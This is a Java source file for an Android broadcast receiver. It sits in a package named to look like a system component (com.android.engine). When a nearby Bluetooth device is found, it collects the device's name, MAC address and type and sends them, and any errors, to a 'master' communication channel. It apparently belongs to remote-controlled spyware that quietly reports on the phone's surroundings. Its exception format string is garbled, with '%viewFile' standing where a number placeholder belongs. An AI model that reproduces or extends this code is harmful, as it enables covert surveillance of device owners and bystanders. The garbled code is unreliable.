package com.android.engine.receivers;

import Transfer.Action;
import android.bluetooth.BluetoothDevice;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build.VERSION;
import com.android.engine.service.MyService;
import com.android.engine.SendMasterCommunication;
import com.android.engine.ExceptionAction;

import static android.bluetooth.BluetoothDevice.DEVICE_TYPE_CLASSIC;
import static android.bluetooth.BluetoothDevice.DEVICE_TYPE_DUAL;
import static android.bluetooth.BluetoothDevice.DEVICE_TYPE_LE;
import static android.bluetooth.BluetoothDevice.DEVICE_TYPE_UNKNOWN;

public class BluetoothFoundReceiver extends BroadcastReceiver {

  public void onReceive(Context context, Intent intent) {
    try {
      if (VERSION.SDK_INT < 5) {
        throw new Exception(String.format(
            "This feature requires SDK level %viewFile. The device has level %viewFile.",
            new Object[] { 5, VERSION.SDK_INT }));
      } else if (BluetoothDevice.ACTION_FOUND.equals(intent.getAction())) {
        BluetoothDevice bluetoothDevice = intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE);

        Action action = new Action();
        action.ACTION = 58;

        String type = "Unknown";
        if (VERSION.SDK_INT < 18) {
          type = "N/A";
        } else if (bluetoothDevice.getType() == DEVICE_TYPE_CLASSIC) {
          type = "Classic";
        } else if (bluetoothDevice.getType() == DEVICE_TYPE_DUAL) {
          type = "Dual";
        } else if (bluetoothDevice.getType() == DEVICE_TYPE_LE) {
          type = "Le";
        } else if (bluetoothDevice.getType() == DEVICE_TYPE_UNKNOWN) {
          type = "Unknown";
        }

        action.DATA =
            new String[] { bluetoothDevice.getName(), bluetoothDevice.getAddress(), type };

        SendMasterCommunication.sendAction(action);

        MyService.context.unregisterReceiver(this);
      }
    } catch (Exception e) {
      ExceptionAction.sendExceptionAction(e.getMessage());
    }
  }
}
